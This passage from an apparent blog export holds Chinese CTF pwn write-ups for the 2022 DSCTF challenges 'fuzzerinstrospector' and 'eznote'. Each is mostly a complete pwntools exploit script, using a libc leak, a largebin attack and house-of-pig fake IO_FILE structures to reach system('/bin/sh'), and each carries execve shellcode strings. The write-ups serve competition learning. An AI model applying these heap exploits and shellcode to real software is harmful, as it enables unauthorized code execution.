class="number">0</span>);</span><br><span class="line">	func239(<span class="number">0</span>);</span><br><span class="line">	func240(<span class="number">0</span>);</span><br><span class="line">	func241(<span class="number">0</span>);</span><br><span class="line">	func242(<span class="number">0x40</span>);</span><br><span class="line">	func243(<span class="number">0</span>);</span><br><span class="line">	func244(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	func240(<span class="number">0</span>);</span><br><span class="line">	func241(<span class="number">0</span>);</span><br><span class="line">	func242(<span class="number">0</span>);</span><br><span class="line">	func243(<span class="number">0</span>);</span><br><span class="line">	func244(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	upgrade(<span class="number">0</span>);</span><br><span class="line">	fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 DSCTF</title>
    <url>/2022/07/24/CTF/2022dsctf/</url>
    <content><![CDATA[<h2 id="fuzzerinstrospector"><a href="#fuzzerinstrospector" class="headerlink" title="fuzzerinstrospector"></a>fuzzerinstrospector</h2><p>scanf绕过，当我们每次输入<code>+\n</code>或者<code>-\n</code>的时候，就能绕过一个字节不去覆盖它，由此可以泄露残留在unsortedbin中的chunk的fd，也就是泄露libc。同时，题目给了我们一个后门的功能，相信都能看出来。还需要注意的一个问题是<code>Bitmap</code>，这个就相当于一个字典的作用，虽然程序只能打印从bk开始的数据，但是这些泄露的数据是根据fd位置的值来确定的，也就相当于泄露了fd中的数据。</p>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld-2.27.so&quot;</span>, <span class="string">b&quot;./fuzzerinstrospector&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./fuzzerinstrospector&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fuzzerinstrospector&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, hhu, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sla(<span class="string">&#x27;Index: &#123;0&#125;: &#x27;</span>.<span class="built_in">format</span>(i), <span class="built_in">str</span>(hhu[i]))</span><br><span class="line">    sa(<span class="string">&#x27;Bitmap: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, hhu, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sla(<span class="string">&#x27;Index: &#123;0&#125;: &#x27;</span>.<span class="built_in">format</span>(i), <span class="built_in">str</span>(hhu[i]))</span><br><span class="line">    sa(<span class="string">&#x27;Bitmap: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">hhu = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">pld = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    pld += p8(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i, hhu, pld)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">9</span>):   <span class="comment"># 2-8</span></span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">1</span>)   <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)   <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">hhu = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    hhu.append(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">9</span>):</span><br><span class="line">    add(i, hhu, pld)</span><br><span class="line">add(<span class="number">1</span>, hhu, pld)</span><br><span class="line">add(<span class="number">0</span>, hhu, pld)</span><br><span class="line"></span><br><span class="line">check(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;Bitmap set: \n&#x27;</span>)</span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Bit:&#x27;</span>)</span><br><span class="line">    fd += <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]) &lt;&lt; (<span class="number">8</span> * i)</span><br><span class="line">lg(<span class="string">&#x27;fd&#x27;</span>)</span><br><span class="line">libc_base = fd - <span class="number">0x3ebeb0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn</span></span><br><span class="line">bs = []</span><br><span class="line">str_bin_sh = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    bs.append(<span class="built_in">ord</span>(str_bin_sh[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>, bs, pld)</span><br><span class="line">sla(<span class="string">&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(system))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h2><p>数组溢出的问题，在最后一次的分配时会将第一次分配的堆块头给改写，产生堆叠。</p>
<blockquote>
<p>具体利用参照我的io总结，这里只附上wp了</p>
</blockquote>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">b&quot;./eznote&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./eznote&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./eznote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># make overlapping</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0xca1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 7</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&#x27;Note3:\n&#x27;</span>)</span><br><span class="line">key = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x219ce0</span></span><br><span class="line">io_list_all = libc_base + <span class="number">0x21a680</span></span><br><span class="line">io_str_jumps = libc_base + <span class="number">0x2166c0</span></span><br><span class="line">system = libc_base + <span class="number">0x50d60</span></span><br><span class="line">memcpy_got = libc_base + <span class="number">0x219160</span></span><br><span class="line">memset = libc_base + libc.sym[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;memcpy_got&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;memset&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin_attack</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x838</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0e0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0xb90</span>)</span><br><span class="line">pld += p64(io_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>, pld)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------house of pig----------- #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free tcache_struct(size = 0x290) to tcache</span></span><br><span class="line">new_size = <span class="number">0x408</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x10</span>     <span class="comment"># tcache_struct</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2d00</span> - <span class="number">0x10</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE1 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE1 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE1 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify tcache_stryct</span></span><br><span class="line">new_size = <span class="number">0x288</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x790</span>    <span class="comment"># data to modify tcache_stryct</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2dd0</span> - <span class="number">0x10</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE2 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE2 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE2 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify memcpy@got -&gt; system</span></span><br><span class="line">new_size = <span class="number">0x128</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x1830</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2e90</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE3 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE3 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE3 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn</span></span><br><span class="line">new_size = <span class="number">0x108</span></span><br><span class="line">copy_heap_addr = heap_base</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE4 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE4 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE4 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p16(<span class="number">1</span>) * <span class="number">0x20</span> + p64(memcpy_got - <span class="number">0x10</span>) * <span class="number">0x30</span>)     <span class="comment"># tcache struct</span></span><br><span class="line">edit(<span class="number">1</span>, fake_IO_FILE1)</span><br><span class="line">edit(<span class="number">2</span>, fake_IO_FILE2 + fake_IO_FILE3 + fake_IO_FILE4)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + p64(system) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(memset))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>DSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 ciscn 复赛</title>
    <url>/2022/07/21/CTF/2022ciscn%E5%A4%8D%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="duck"><a href="#duck" class="headerlink" title="duck"></a>duck</h2><p>一道glibc2.34的经典堆题，存在uaf的漏洞，学习两种利用方法。</p>
<blockquote>
<p>参考文章：<a href="http://blog.nsfocus.net/glibc-234/">浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.net)</a></p>
</blockquote>
